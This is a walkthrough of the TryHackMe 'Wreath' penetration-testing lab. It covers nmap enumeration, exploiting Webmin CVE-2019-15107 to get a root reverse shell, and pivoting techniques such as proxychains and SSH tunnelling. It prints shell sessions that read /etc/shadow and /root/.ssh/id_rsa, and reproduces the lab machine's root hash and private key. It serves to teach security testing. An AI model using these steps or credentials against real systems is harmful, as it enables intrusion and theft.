# Wreath

![alt text](https://assets.tryhackme.com/room-banners/wreath_banner.png)

**Source:**  MuirlandOracle

***Description:***
  Learn how to pivot through a network by compromising a public facing web machine and tunnelling your traffic to access other machines in Wreath's network.
  
  ***Related Hosting Links***

- *TryHackMe.com*
  - Link: https://tryhackme.com/room/wreath
 
- ***[Task 1]: Introduction***
   ![alt text](https://github.com/kashyap-source/Try-Hack-Me/blob/master/Wreath/Image/pic.png)

  Wreath is designed as a learning resource for beginners with a primary focus on:

    - Pivoting
    - Working with the Empire C2 (Command and Control) framework
    - Simple Anti-Virus evasion techniques

    The following topics will also be covered, albeit more briefly:

     - Code Analysis (Python and PHP)
     - Locating and modifying public exploits
     - Simple webapp enumeration and exploitation
     - Git Repository Analysis
     - Simple Windows Post-Exploitation techniques
     - CLI Firewall Administration (CentOS and Windows)
     - Cross-Compilation techniques
     - Coding wrapper programs
     - Simple exfiltration techniques
     - Formatting a pentest report

   These will be taught in the course of exploiting the Wreath network.

   This is designed as almost a sandbox environment to follow along with the teaching content; the focus will be on the above teaching points, rather than on initial access and    privilege escalation exploits (contrary to other boxes on the platform where the focus is on the challenge).
 
   ***Prerequisites:***
     This network is designed for beginners, but assumes basic competence in the Linux command line and fundamental hacking methodology. The ability to read and write a little      code will also be useful. Any other required knowledge will be linked throughout the tasks.
 
 
- ***[Task 2]: Accessing the Network***
 
    ***Controlling the Network:***

    The network has three states: Running, Stopped, and Resetting.

    The current state can be shown at the top right of the network box at the top of the page:
    ![alt text](https://assets.tryhackme.com/additional/wreath-network/fe129fa984de.png)

    - Running means that the network is fully operational and can be connected to at will
    - Stopped indicates that the network has gone to sleep. This happens when no one has pressed the "Extend" button within a set time limit so as to prevent the network from         being constantly running with no one using it. It can be restarted by pressing the "Start" button. This does not reset the network back to a clean copy, so anything stored       on the targets should still be there
    - Resetting indicates that the network is currently in the process of being wiped clean and resetting back to its default state. This can be used when something (or someone)       has happened to one of the targets rendering it broken

    The three buttons below the network map can be used to control this functionality:
 
    ![alt text](https://assets.tryhackme.com/additional/wreath-network/fbf6ced6514d.png)

    - The "Start" button restarts the network once stopped
    - The "Extend" button prevents the network from going to sleep. This button also contains a timer showing how long until the network shuts down
    - The "Reset" button initiates a full wipe of the network. This requires a percentage of users in the network to click the button, thus preventing a single person from             spamming resets 

- ***[Task 3]: Intro Backstory***

   Out of the blue, an old friend from university: Thomas Wreath, calls you after several years of no contact. You spend a few minutes catching up before he reveals the real        reason he called:

   "So I heard you got into hacking? That's awesome! I have a few servers set up on my home network for my projects, I was wondering if you might like to assess them?"

   You take a moment to think about it, before deciding to accept the job -- it's for a friend after all.

   Turning down his offer of payment, you tell him:

- ***[Task 4]: Intro Brief***
    
    Thomas has sent over the following information about the network:

    There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way     in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if     you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and     can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same       difference.

   From this we can take away the following pieces of information:

  - There are three machines on the network
  - There is at least one public facing webserver
  - There is a self-hosted git server somewhere on the network
  - The git server is internal, so Thomas may have pushed sensitive information into it
  - There is a PC running on the network that has antivirus installed, meaning we can hazard a guess that this is likely to be Windows- 
  - By the sounds of it this is likely to be the server variant of Windows, which might work in our favour
  - The (assumed) Windows PC cannot be accessed directly from the webserver

   Before we start, if you are using Kali, make sure that it's up to date:
     - sudo apt update && sudo apt upgrade


***[Task 5]: Webserver Enumeration***
   
   As with any attack, we first begin with the enumeration phase. Completing the Nmap room (if you haven't already) will help with this section.
   Thomas gave us an IP to work with (shown on the Network Panel at the top of the page). Let's start by performing a port scan on the first 15000 ports of this IP.
   Note: Here (and in general), it's a good idea to save your scan results to a file so you don't have to re-run the same scan twice.
  
   How many of the first 15000 ports are open on the target?
   - 4
   
   Perform a service scan on these open ports.
   What OS does Nmap think is running?
   - CentOS

   Okay, we know what we're dealing with.
   Open the IP in your browser -- what site does the server try to redirect you to?
    
   - https://thomaswreath.thm
   
   You will have noticed that the site failed to resolve. Looks like Thomas forgot to set up the DNS!

   Add it to your hosts file manually. This can be accomplished by editing the /etc/hosts file on Linux/MacOS, or C:\Windows\System32\drivers\etc\hosts on Windows, to include t    the IP address, followed by a tab, then the domain name. Note: this must be done as root/Administrator.

   It should look something like this when done, although the IP address and domain name will be different:

   10.10.10.10 example.thm
     
   - No answer needed
 
   Reload the webpage -- it should now resolve, but it will give you a different error related to the TLS certificate. This occurs because the box is not really connected to the    internet and so cannot have a signed TLS certificate. In this instance it is safe to click "Advanced" -> "Accept Risk"; however, you should never do this in the real world.

   In real life we would perform a "footprinting" phase of the engagement at this point. This essentially involves finding as much public information about the target as            possible  and noting it down. You never know what could prove useful!

   Read through the text on the page. What is Thomas' mobile phone number?
     
   - +447821548812
  
  Let's have a look at the highest open port.
  Look back at your service scan results: what server version does Nmap detect as running here?
    
   - MiniServ 1.890 (Webmin httpd)

  Put your answer to the last question into Google.

  It appears that this service is vulnerable to an unauthenticated remote code execution exploit!

  What is the CVE number for this exploit?
    
   - CVE-2019-15107

    # NMAP:
    ┌──(root💀DESKTOP)-[~/Documents/Wreath]
    └─# nmap -vv -sV 10.200.106.200                 
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-25 11:41 IST
    NSE: Loaded 45 scripts for scanning.
    Initiating Ping Scan at 11:41
    Scanning 10.200.106.200 [4 ports]
    Completed Ping Scan at 11:41, 0.15s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 11:41
    Completed Parallel DNS resolution of 1 host. at 11:41, 1.04s elapsed
    Initiating SYN Stealth Scan at 11:41
    Scanning 10.200.106.200 [1000 ports]
    Discovered open port 80/tcp on 10.200.106.200
    Discovered open port 22/tcp on 10.200.106.200
    Discovered open port 443/tcp on 10.200.106.200
    Discovered open port 10000/tcp on 10.200.106.200
    Completed SYN Stealth Scan at 11:41, 9.50s elapsed (1000 total ports)
    Initiating Service scan at 11:41
    Scanning 4 services on 10.200.106.200
    Completed Service scan at 11:41, 26.06s elapsed (4 services on 1 host)
    NSE: Script scanning 10.200.106.200.
    NSE: Starting runlevel 1 (of 2) scan.
    Initiating NSE at 11:41
    Completed NSE at 11:42, 30.01s elapsed
    NSE: Starting runlevel 2 (of 2) scan.
    Initiating NSE at 11:42
    Completed NSE at 11:42, 2.02s elapsed
    Nmap scan report for 10.200.106.200
    Host is up, received echo-reply ttl 63 (0.16s latency).
    Scanned at 2021-03-25 11:41:04 IST for 69s
    Not shown: 995 filtered ports
    Reason: 980 no-responses and 15 admin-prohibiteds
    PORT      STATE  SERVICE    REASON         VERSION
    22/tcp    open   ssh        syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
    80/tcp    open   http       syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
    443/tcp   open   ssl/https? syn-ack ttl 63
    9090/tcp  closed zeus-admin reset ttl 63
    10000/tcp open   http       syn-ack ttl 63 MiniServ 1.890 (Webmin httpd)

    Read data files from: /usr/bin/../share/nmap
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 69.27 seconds
           Raw packets sent: 1989 (87.492KB) | Rcvd: 22 (1.368KB)


    ┌──(root💀DESKTOP)-[~/Documents/Wreath]
    └─# cat /etc/hosts
    # This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:
    # [network] 
    # generateHosts = false
    127.0.0.1       localhost
    127.0.1.1       DESKTOP-7K6I4IF.localdomain     DESKTOP-7K6I4IF
    127.0.0.1       localhost
    ::1     localhost

    # The following lines are desirable for IPv6 capable hosts
      ::1     ip6-localhost ip6-loopback
      fe00::0 ip6-localnet
      ff00::0 ip6-mcastprefix
      ff02::1 ip6-allnodes
      ff02::2 ip6-allrouters

      10.200.106.200  thomaswreath.thm

  
  
***[Task 6]: Webserver Exploitation***
      
   In the previous task we found a vulnerable service[1][2] running on the target which will give us the ability to execute commands on the target.

   The next step would usually be to find an exploit for this vulnerability. There are often exploits available online for known vulnerabilities (and we will cover searching for    these in an upcoming task!), however, in this instance, an exploit is provided here.

   Start by cloning the repository. This can be done with the following command:

    - git clone https://github.com/MuirlandOracle/CVE-2019-15107

   This creates a local copy of the exploit on our attacking machine. Navigate into the folder then install the required Python libraries:

    - cd CVE-2019-15107 && pip3 install -r requirements.txt

   If this doesn't work, you may need to install pip before downloading the libraries. This can be done with:
 
    - sudo apt install python3-pip

  The script should already be executable, but if not, add the executable bit (chmod +x ./CVE-2019-15107.py).

  Never run an unknown script from the internet! Read through the code and see if you can get an idea of what it's doing. (Don't worry if you aren't familiar with Python -- in     this case the exploit was coded by the author of this content and is being run in a lab environment, so you can infer that it isn't malicious. It is, however, good practice to   read through scripts before running them).

  Once you're satisfied that the script will do what it says it will, run the exploit against the target!

    - ./CVE-2019-15107.py TARGET_IP

  - What is Webmin?
     
     Webmin is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more.        Webmin removes the need to manually edit Unix configuration files like /etc/passwd, and lets you manage a system from the console or remotely, the official website says. 

   Which user was the server running as?
 
   - root

   Success! We won't need to escalate privileges here, so we can move on to the next step in the exploitation process.

   Before we do though: nice though this pseudoshell is, it's not a full reverse shell.

   Get a reverse shell from the target. You can either do this manually, or by typing shell into the pseudoshell and following the instructions given.

  - No answer needed

   Optional: Stabilise the reverse shell. There are several techniques for doing this detailed here.

   - No answer needed

   Now for a little post-exploitation!

  What is the root user's password hash?

  - $6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1

  You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of     the other services on the box.

  What is the full path to this file?

  - /root/.ssh/id_rsa
  
  Download the key (copying and pasting it to a file on your own Attacking Machine works), then use the command chmod 600 KEY_NAME (substituting in the name of the key) to         obtain persistent access to the box.
   Run the exploit and obtain a pseudoshell on the target!


        ┌──(root💀DESKTOP-7K6I4IF)-[~/Documents/Wreath/CVE-2019-15107]
        └─# ./CVE-2019-15107.py 10.200.106.200

        __        __   _               _         ____   ____ _____ 
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|  
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___ 
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|

                                                @MuirlandOracle

        # PSEUDOSHELL:
        [*] Server is running in SSL mode. Switching to HTTPS
        [+] Connected to https://10.200.106.200:10000/ successfully.
        [+] Server version (1.890) should be vulnerable! 
        [+] Benign Payload executed!

        [+] The target is vulnerable and a pseudoshell has been obtained. 
        Type commands to have them executed on the target.
        [*] Type 'exit' to exit. 
        [*] Type 'shell' to obtain a full reverse shell (UNIX only).
        #id
        uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
        #shell
        sh-4.4# cat /etc/shadow
        cat /etc/shadow
        root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
        ┌──(root💀DESKTOP-7K6I4IF)-[~]
        └─# nc -lnvp 4444
         Listening on 0.0.0.0 4444
         Connection received on 10.200.106.200 51376
         sh: cannot set terminal process group (1781): Inappropriate ioctl for device
         sh: no job control in this shell

        sh-4.4# cat /root/.ssh/id_rsa
        cat /root/.ssh/id_rsa
                   -----BEGIN OPENSSH PRIVATE KEY-----
        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
                      -----END OPENSSH PRIVATE KEY-----


         ┌──(root💀DESKTOP-7K6I4IF)-[~/Documents/Wreath]
         └─# chmod 600 KEY_rsa 

         ┌──(root💀DESKTOP-7K6I4IF)-[~/Documents/Wreath]
         └─#ssh -i 'KEY_rsa' root@IP

         #Victim machine:
         [root@prod-serv tmp]#



***[Task 7]: Pivoting What is Pivoting?***

   Pivoting is the art of using access obtained over one machine to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration    testing, and is one of the three main teaching points for this room.

   Put simply, by using one of the techniques described in the following tasks (or others!), it becomes possible for an attacker to gain initial access to a remote network, and    use it to access other machines in the network that would not otherwise be accessible:

   ![alt text](https://assets.tryhackme.com/additional/wreath-network/6904b85a9b93.png)

   In this diagram, there are four machines on the target network: one public facing server, with three machines which are not exposed to the internet. By accessing the public     server, we can then pivot to attack the remaining three targets.

   Note: This is an example diagram and is not representative of the Wreath Network.


***[Task 8]: Pivoting High-level Overview***

   The methods we use to pivot tend to vary between the different target operating systems. Frameworks like Metasploit can make the process easier, however, for the time being,    we'll be looking at more manual techniques for pivoting.

   There are two main methods encompassed in this area of pentesting:

   Tunnelling/Proxying: Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially      also be tunnelled inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic Intrusion Detection System (IDS) or firewall
   Port Forwarding: Creating a connection between a local port and a single port on a target, via a compromised host
   A proxy is good if we want to redirect lots of different kinds of traffic into our target network -- for example, with an nmap scan, or to access multiple ports on multiple      different machines.

   Port Forwarding tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device.

  Which style of pivoting is more suitable will depend entirely on the layout of the network, so we'll have to start with further enumeration before we decide how to proceed. It   would be sensible at this point to also start to draw up a layout of the network as you see it -- although in the case of this practice network, the layout is given in the box   at the top of the screen.

  As a general rule, if you have multiple possible entry-points, try to use a Linux/Unix target where possible, as these tend to be easier to pivot from. An outward facing Linux   webserver is absolutely ideal.

  The remaining tasks in this section will cover the following topics:

  Enumerating a network using native and statically compiled tools
  - Proxychains / FoxyProxy
  - SSH port forwarding and tunnelling (primarily Unix)
  - plink.exe (Windows)
  - socat (Windows and Unix)
  - chisel (Windows and Unix)
  - sshuttle (currently Unix only)
  This is far from an exhaustive list of the tools available for pivoting, so further research is encouraged.

  Research: Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?


***[Task 9]: Pivoting Enumeration***

   As always, enumeration is the key to success. Information is power -- the more we know about our target, the more options we have available to us. As such, our first step        when attempting to pivot through a network is to get an idea of what's around us.

   There are five possible ways to enumerate a network through a compromised host:

   - Using material found on the machine. The hosts file or ARP cache, for example
   - Using pre-installed tools
   - Using statically compiled tools
   - Using scripting techniques
   - Using local tools through a proxy
   These are written in the order of preference. Using local tools through a proxy is incredibly slow, so should only be used as a last resort. Ideally we want to take advantage    of pre-installed tools on the system (Linux systems sometimes have Nmap installed by default, for example). This is an example of Living off the Land (LotL) -- a good way to    minimise risk. Failing that, it's very easy to transfer a static binary, or put together a simple ping-sweep tool in Bash (which we'll cover below).

   Before anything else though, it's sensible to check to see if there are any pieces of useful information stored on the target. arp -a can be used to Windows or Linux to check    the ARP cache of the machine -- this will show you any IP addresses of hosts that the target has interacted with recently. Equally, static mappings may be found in /etc/hosts    on Linux, or C:\Windows\System32\drivers\etc\hosts on Windows. /etc/resolv.conf on Linux may also identify any local DNS servers, which may be misconfigured to allow            something like a DNS zone transfer attack (which is outwith the scope of this content, but worth looking into). On Windows the easiest way to check the DNS servers for an        interface is with ipconfig /all. Linux has an equivalent command as an alternative to reading the resolv.conf file: nmcli dev show.

   If there are no useful tools already installed on the system, and the rudimentary scripts are not working, then it's possible to get static copies of many tools. These are      versions of the tool that have been compiled in such a way as to not require any dependencies from the box. In other words, they could theoretically work on any target,          assuming the correct OS and architecture. For example: statically compiled copies of Nmap for different operating systems (along with various other tools) can be found in        various places on the internet. A good (if dated) resource for these can be found here. A more up-to-date (at the time of writing) version of Nmap for Linux specifically can    be found here. Be aware that many repositories of static tools are very outdated. Tools from these repositories will likely still do the job; however, you may find that they    require different syntax, or don't work in quite the way that you've come to expect.

   Note: The difference between a "static" binary and a "dynamic" binary is in the compilation. Most programs use a variety of external libraries (.so files on Linux, or .dll      files on Windows) -- these are referred to as "dynamic" programs. Static programs are compiled with these libraries built into the finished executable file. When we're trying    to use the binary on a target system we will nearly always need a statically compiled copy of the program, as the system may not have the dependencies installed meaning that    a dynamic binary would be unable to run.

   Finally, the dreaded scanning through a proxy. This should be an absolute last resort, as scanning through something like proxychains is very slow, and often limited (you        cannot scan UDP ports through a TCP proxy, for example). The one exception to this rule is when using the Nmap Scripting Engine (NSE), as the scripts library does not come      with the statically compiled version of the tool. As such, you can use a static copy of Nmap to sweep the network and find hosts with open ports, then use your local copy of    Nmap through a proxy specifically against the found ports.

   Before putting this all into practice let's talk about living off the land shell techniques. Ideally a tool like Nmap will already be installed on the target; however, this      is not always the case (indeed, you'll find that Nmap is not installed on the currently compromised server of the Wreath network). If this happens, it's worth looking into      whether you can use an installed shell to perform a sweep of the network. For example, the following Bash one-liner would perform a full ping sweep of the 192.168.1.x            network:

     for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done

   This could be easily modified to search other network ranges -- including the Wreath network.

   The above command generates a full list of numbers from 1 to 255 and loops through it. For each number, it sends one ICMP ping packet to Radar filler image192.168.1.x as a      backgrounded job (meaning that each ping runs in parallel for speed), where i is the current number. Each response is searched for "bytes from" to see if the ping was            successful. Only successful responses are shown.

   The equivalent of this command in Powershell is unbearably slow, so it's better to find an alternative option where possible. It's relatively straight forward to write a        simple network scanner in a language like C#, which can be compiled and used on the target. This, however, is outwith the scope of the Wreath network (although a very simple    beta example can be found here).

   It's worth noting as well that you may encounter hosts which have firewalls blocking ICMP pings (Windows boxes frequently do this, for example). This is likely to be less of    a problem when pivoting, however, as these firewalls (by default) often only apply to external traffic, meaning that anything sent through a compromised host on the network      should be safe. It's worth keeping in mind, however.

   If you suspect that a host is active but is blocking ICMP ping requests, you could also check some common ports using a tool like netcat.
   Port scanning in bash can be done (ideally) entirely natively:

     for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done

   Bear in mind that this will take a very long time, however!

   There are many other ways to perform enumeration using only the tools available on a system, so please experiment further and see what you can come up with!

   What is the absolute path to the file containing DNS entries on Linux?
    
   - /etc/resolv.conf

  What is the absolute path to the hosts file on Windows?

   - C:\Windows\System32\drivers\etc\hosts

  How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?

   - for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done


***[Task 10]: Pivoting Proxychains & Foxyproxy***

   In this task we'll be looking at two "proxy" tools: Proxychains and FoxyProxy. These both allow us to connect through one of the proxies we'll learn about in the upcoming        tasks. When creating a proxy we open up a port on our own attacking machine which is linked to the compromised server, giving us access to the target network.

   Think of this as being something like a tunnel created between a port on our attacking box that comes out inside the target network -- like a secret tunnel from a fantasy        story, hidden beneath the floorboards of the local bar and exiting in the palace treasure chamber.

   Proxychains and FoxyProxy can be used to direct our traffic through this port and into our target network.

   Proxychains

   Proxychains is a tool we have already briefly mentioned in previous tasks. It's a very useful tool -- although not without its drawbacks. Proxychains can often slow down a      connection: performing an nmap scan through it is especially hellish. Ideally you should try to use static tools where possible, and route traffic through proxychains only      when required.

  That said, let's take a look at the tool itself.

  Proxychains is a command line tool which is activated by prepending the command proxychains to other commands. For example, to proxy netcat  through a proxy, you could use the   command:
        
      proxychains nc 172.16.0.10 23

  Notice that a proxy port was not specified in the above command. This is because proxychains reads its options from a config file. The master config file is located at           /etc/proxychains.conf. This is where proxychains will look by default; however, it's actually the last location where proxychains will look. The locations (in order) are:

  - The current directory (i.e. ./proxychains.conf)
  - ~/.proxychains/proxychains.conf
  - /etc/proxychains.conf
  This makes it extremely easy to configure proxychains for a specific assignment, without altering the master file. Simply execute: cp /etc/proxychains.conf ., then make any     changes to the config file in a copy stored in your current directory. If you're likely to move directories a lot then you could instead place it in a .proxychains directory     under your home directory, achieving the same results. If you happen to lose or destroy the original master copy of the proxychains config, a replacement can be downloaded       from here.

  Speaking of the proxychains.conf file, there is only one section of particular use to us at this moment of time: right at the bottom of the file are the servers used by the     proxy. You can set more than one server here to chain proxies together, however, for the time being we will stick to one proxy:


  ![alt text](https://assets.tryhackme.com/additional/wreath-network/443c865e3ff3.png)

  Specifically, we are interested in the "ProxyList" section:

  [ProxyList]
  
  ![image](https://user-images.githubusercontent.com/68686150/114843643-a70c0d80-9df7-11eb-9247-70073d99d489.png)
  
  It is here that we can choose which port(s) to forward the connection through. By default there is one proxy set to localhost port 9050 -- this is the default port for a Tor     entrypoint, should you choose to run one on your attacking machine. That said, it is not hugely useful to us. This should be changed to whichever (arbitrary) port is being       used for the proxies we'll be setting up in the following tasks.

  There is one other line in the Proxychains configuration that is worth paying attention to, specifically related to the Proxy DNS settings:

  ![alt text](https://assets.tryhackme.com/additional/wreath-network/3af17f6ddafc.png)
  
  If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the proxy_dns line using a hashtag (#) at the start of   the line before performing a scan through the proxy!

  ![alt text](https://assets.tryhackme.com/additional/wreath-network/557437aec525.png)
  
  Other things to note when scanning through proxychains:

  You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packest (Ping requests) will also not work through the proxy, so use the  -Pn  switch to prevent Nmap from       trying it.
  It will be extremely slow. Try to only use Nmap through a proxy when using the NSE (i.e. use a static binary to see where the open ports/hosts are before proxying a local copy   of nmap to use the scripts library).

  #FoxyProxy

  Proxychains is an acceptable option when working with CLI tools, but if working in a web browser to access a webapp through a proxy, there is a better option available,         namely: FoxyProxy!

  People frequently use this tool to manage their BurpSuite/ZAP proxy quickly and easily, but it can also be be used alongside the tools we'll be looking at in subsequent tasks   in order to access web apps on an internal network. FoxyProxy is a browser extension which is available for Firefox and Chrome. There are two versions of FoxyProxy available:   Basic and Standard. Basic works perfectly for our purposes, but feel free to experiment with standard if you wish.

  After installing the extension in your browser of choice, click on it in your toolbar:

  ![alt text](https://assets.tryhackme.com/additional/wreath-network/c22f2ef3d6fc.png)

  Click on the "Options" button. This will take you to a page where you can configure your saved proxies. Click "Add" on the left hand side of the screen:

  ![alt text](https://assets.tryhackme.com/additional/wreath-network/92e3cabe22e8.png)

  Fill in the IP and Port on the right hand side of the page that appears, then give it a name. Set the proxy type to the kind of proxy you will be using. SOCKS4 is usually a     good bet, although Chisel (which we will cover in a later task) requires SOCKS5. An example config is given here:

  ![alt text](https://assets.tryhackme.com/additional/wreath-network/19436164d15e.png)

  Press Save, then click on the icon in the task bar again to bring up the proxy menu. You can switch between any of your saved proxies by clicking on them:

  ![alt text](https://assets.tryhackme.com/additional/wreath-network/1d91c2b6a625.png)

  Once activated, all of your browser traffic will be redirected through the chosen port (so make sure the proxy is active!). Be aware that if the target network doesn't have     internet access (like all TryHackMe boxes) then you will not be able to access the outside internet when the proxy is activated. Even in a real engagement, routing your         general internet searches through a client's network is unwise anyway, so turning the proxy off (or using the routing features in FoxyProxy standard) for everything other than   interaction with the target network is advised.

  With the proxy activated, you can simply navigate to the target domain or IP in your browser and the proxy will take care of the rest!


  What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?

   - socks4 127.0.0.1 4242

  What command would you use to telnet through a proxy to 172.16.0.100:23?

   - proxychains telnet 172.16.0.100 23

  You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?

   - FP


***[Task 11]: Pivoting SSH Tunnelling / Port Forwarding***

   The first tool we'll be looking at is none other than the bog-standard SSH client with an OpenSSH server. Using these simple tools, it's possible to create both forward and      reverse connections to make SSH "tunnels", allowing us to forward ports, and/or create proxies.

   - Forward Connections

   Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target. As such, this technique is much more commonly used          against Unix hosts. Linux servers, in particular, commonly have SSH active and open. That said, Microsoft (relatively) recently brought out their own implementation of the      OpenSSH server, native to Windows, so this technique may begin to get more popular in this regard if the feature were to gain more traction.

   There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.

   Port forwarding is accomplished with the -L switch, which creates a link to a Local port. For example, if we had SSH access to 172.16.0.5 and there's a webserver running on      172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:
   
     - ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN

